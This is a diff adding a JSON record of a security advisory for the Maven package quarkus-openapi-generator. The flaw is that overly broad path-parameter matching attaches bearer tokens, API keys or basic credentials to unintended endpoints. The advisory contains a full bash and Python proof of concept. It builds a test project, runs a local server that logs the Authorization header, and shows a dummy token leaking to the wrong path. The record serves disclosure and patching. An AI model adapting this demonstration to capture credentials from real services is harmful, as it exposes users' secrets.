@@ -1,0 +1,56 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-05-04T21:15:55Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.quarkiverse.openapi.generator:quarkus-openapi-generator"
+  },
+  "Advisory": {
+    "DatabaseId": 352835,
+    "Id": "GSA_kwCzR0hTQS1mcjhmLXJ3angtZjMyds4ABWJD",
+    "GhsaId": "GHSA-fr8f-rwjx-f32v",
+    "References": [
+      {
+        "Url": "https://github.com/quarkiverse/quarkus-openapi-generator/security/advisories/GHSA-fr8f-rwjx-f32v"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-fr8f-rwjx-f32v"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-fr8f-rwjx-f32v"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42333"
+      }
+    ],
+    "Description": "### Summary\n\nThe generated authentication filter matches OpenAPI path templates too broadly when deciding whether to attach credentials. A security scheme configured for one operation can therefore be applied to a different same-method operation whose path only partially resembles the protected template, causing bearer tokens, API keys, or basic credentials to be sent to unintended endpoints.\n\n### Details\n\nThe runtime authentication layer selects credentials by comparing the outgoing request path and method against the set of protected OpenAPI operations. Path-template matching treats `{param}` placeholders as `.*`, which incorrectly allows a single path parameter to consume `/`.\n\nAs a result, a protected path such as `/repos/{ref}` also matches `/repos/foo/bar`, even though `/repos/{owner}/{repo}` is a different operation. When a client invokes the unprotected operation, the authentication filter still concludes that the protected operation matched and attaches its credentials.\n\nThis affects authentication providers that rely on the shared path-matching logic, including bearer, OAuth, API-key, and basic authentication. The issue is reachable through normal generated-client usage and does not require modifying generated code.\n\n### PoC\n\n```bash\nmkdir -p /tmp/qoag-poc/src/main/java/org/acme\nmkdir -p /tmp/qoag-poc/src/main/resources\nmkdir -p /tmp/qoag-poc/src/main/openapi\n\ncat \u003e /tmp/qoag-poc/pom.xml \u003c\u003c'EOF'\n\u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e\n  \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e\n  \u003cgroupId\u003eorg.acme\u003c/groupId\u003e\n  \u003cartifactId\u003eqoag-poc\u003c/artifactId\u003e\n  \u003cversion\u003e1.0.0\u003c/version\u003e\n\n  \u003cproperties\u003e\n    \u003cproject.build.sourceEncoding\u003eUTF-8\u003c/project.build.sourceEncoding\u003e\n    \u003cmaven.compiler.release\u003e17\u003c/maven.compiler.release\u003e\n    \u003cquarkus.platform.group-id\u003eio.quarkus\u003c/quarkus.platform.group-id\u003e\n    \u003cquarkus.platform.artifact-id\u003equarkus-bom\u003c/quarkus.platform.artifact-id\u003e\n    \u003cquarkus.platform.version\u003e3.34.3\u003c/quarkus.platform.version\u003e\n    \u003cqoag.version\u003e2.16.0\u003c/qoag.version\u003e\n  \u003c/properties\u003e\n\n  \u003cdependencyManagement\u003e\n    \u003cdependencies\u003e\n      \u003cdependency\u003e\n        \u003cgroupId\u003e${quarkus.platform.group-id}\u003c/groupId\u003e\n        \u003cartifactId\u003e${quarkus.platform.artifact-id}\u003c/artifactId\u003e\n        \u003cversion\u003e${quarkus.platform.version}\u003c/version\u003e\n        \u003ctype\u003epom\u003c/type\u003e\n        \u003cscope\u003eimport\u003c/scope\u003e\n      \u003c/dependency\u003e\n    \u003c/dependencies\u003e\n  \u003c/dependencyManagement\u003e\n\n  \u003cdependencies\u003e\n    \u003cdependency\u003e\n      \u003cgroupId\u003eio.quarkiverse.openapi.generator\u003c/groupId\u003e\n      \u003cartifactId\u003equarkus-openapi-generator\u003c/artifactId\u003e\n      \u003cversion\u003e${qoag.version}\u003c/version\u003e\n    \u003c/dependency\u003e\n    \u003cdependency\u003e\n      \u003cgroupId\u003eio.quarkus\u003c/groupId\u003e\n      \u003cartifactId\u003equarkus-rest\u003c/artifactId\u003e\n    \u003c/dependency\u003e\n    \u003cdependency\u003e\n      \u003cgroupId\u003eio.quarkus\u003c/groupId\u003e\n      \u003cartifactId\u003equarkus-rest-client-jackson\u003c/artifactId\u003e\n    \u003c/dependency\u003e\n  \u003c/dependencies\u003e\n\n  \u003cbuild\u003e\n    \u003cplugins\u003e\n      \u003cplugin\u003e\n        \u003cgroupId\u003eio.quarkus\u003c/groupId\u003e\n        \u003cartifactId\u003equarkus-maven-plugin\u003c/artifactId\u003e\n        \u003cversion\u003e${quarkus.platform.version}\u003c/version\u003e\n        \u003cextensions\u003etrue\u003c/extensions\u003e\n        \u003cexecutions\u003e\n          \u003cexecution\u003e\n            \u003cgoals\u003e\n              \u003cgoal\u003ebuild\u003c/goal\u003e\n              \u003cgoal\u003egenerate-code\u003c/goal\u003e\n              \u003cgoal\u003egenerate-code-tests\u003c/goal\u003e\n            \u003c/goals\u003e\n          \u003c/execution\u003e\n        \u003c/executions\u003e\n      \u003c/plugin\u003e\n      \u003cplugin\u003e\n        \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e\n        \u003cversion\u003e3.14.0\u003c/version\u003e\n        \u003cconfiguration\u003e\n          \u003cparameters\u003etrue\u003c/parameters\u003e\n        \u003c/configuration\u003e\n      \u003c/plugin\u003e\n    \u003c/plugins\u003e\n  \u003c/build\u003e\n\u003c/project\u003e\nEOF\n\ncat \u003e /tmp/qoag-poc/src/main/openapi/repro.yaml \u003c\u003c'EOF'\nopenapi: 3.0.3\ninfo:\n  title: repro\n  version: 1.0.0\n\npaths:\n  /repos/{ref}:\n    get:\n      operationId: getRef\n      parameters:\n        - in: path\n          name: ref\n          required: true\n          schema:\n            type: string\n      security:\n        - bearerAuth: []\n      responses:\n        \"200\":\n          description: ok\n          content:\n            text/plain:\n              schema:\n                type: string\n\n  /repos/{owner}/{repo}:\n    get:\n      operationId: getOwnerRepo\n      parameters:\n        - in: path\n          name: owner\n          required: true\n          schema:\n            type: string\n        - in: path\n          name: repo\n          required: true\n          schema:\n            type: string\n      responses:\n        \"200\":\n          description: ok\n          content:\n            text/plain:\n              schema:\n                type: string\n\ncomponents:\n  securitySchemes:\n    bearerAuth:\n      type: http\n      scheme: bearer\nEOF\n\ncat \u003e /tmp/qoag-poc/src/main/resources/application.properties \u003c\u003c'EOF'\nquarkus.http.port=8081\nquarkus.openapi-generator.codegen.default-security-scheme=bearerAuth\nquarkus.openapi-generator.codegen.spec.repro_yaml.base-package=org.acme.repro\nquarkus.rest-client.repro_yaml.url=http://127.0.0.1:18080\nquarkus.openapi-generator.repro_yaml.auth.bearerAuth.bearer-token=SECRET\nEOF\n\ncat \u003e /tmp/qoag-poc/src/main/java/org/acme/TriggerResource.java \u003c\u003c'EOF'\npackage org.acme;\n\nimport jakarta.ws.rs.GET;\nimport jakarta.ws.rs.Path;\nimport jakarta.ws.rs.Produces;\nimport jakarta.ws.rs.core.MediaType;\nimport org.eclipse.microprofile.rest.client.inject.RestClient;\n\n@Path(\"/trigger\")\npublic class TriggerResource {\n    @RestClient\n    org.acme.repro.api.DefaultApi api;\n\n    @GET\n    @Produces(MediaType.TEXT_PLAIN)\n    public String trigger() {\n        api.getOwnerRepo(\"foo\", \"bar\");\n        return \"done\";\n    }\n}\nEOF\n\npython - \u003c\u003c'PY' \u0026\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        print(\"PATH=\" + self.path, flush=True)\n        print(\"AUTH=\" + str(self.headers.get(\"Authorization\")), flush=True)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"ok\")\n    def log_message(self, fmt, *args):\n        pass\nHTTPServer((\"127.0.0.1\", 18080), H).serve_forever()\nPY\n\ncd /tmp/qoag-poc\nmvn -q package -DskipTests\njava -jar target/quarkus-app/quarkus-run.jar \u0026\nsleep 8\ncurl -s http://127.0.0.1:8081/trigger\n\n# PATH=/repos/foo/bar\n# AUTH=Bearer SECRET\n```\n\n### Impact\n\nClients generated from an OpenAPI specification can send authentication credentials to endpoints that were not intended to receive them. In practice, this can disclose bearer tokens, API keys, or basic credentials to lower-trust routes on the same service, cause public operations to be invoked with privileged credentials, and blur the intended security boundary between protected and unprotected operations.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-04T21:15:55Z",
+    "Severity": "MODERATE",
+    "Summary": "quarkus-openapi-generator has overly broad path-parameter matching that sends authentication headers to unintended operations",
+    "UpdatedAt": "2026-05-04T21:15:55Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.17.0"
+      },
+      "VulnerableVersionRange": "= 2.16.0"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.16.0-lts"
+      },
+      "VulnerableVersionRange": "\u003c 2.16.0-lts"
+    }
+  ]
+}
